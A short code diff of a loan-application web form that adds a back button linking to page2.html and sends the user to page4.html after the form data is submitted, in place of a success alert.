@@ -152,7 +152,7 @@ input{
   <input type="tel" name="phone" placeholder="612345678" required>
 </div>
 
-<button type="button" class="btn gray">
+<button type="button" class="btn gray" onclick="window.location.href='page2.html'">
 KA HORE
 </button>
 
@@ -186,7 +186,9 @@ document.getElementById("loanForm")
     body:JSON.stringify(formData)
   });
 
-  alert("Data sent successfully ✅");
+  // ✅ OPEN PAGE 4 AFTER SUCCESS
+  window.location.href = "page4.html";
+
 });
 </script>
 
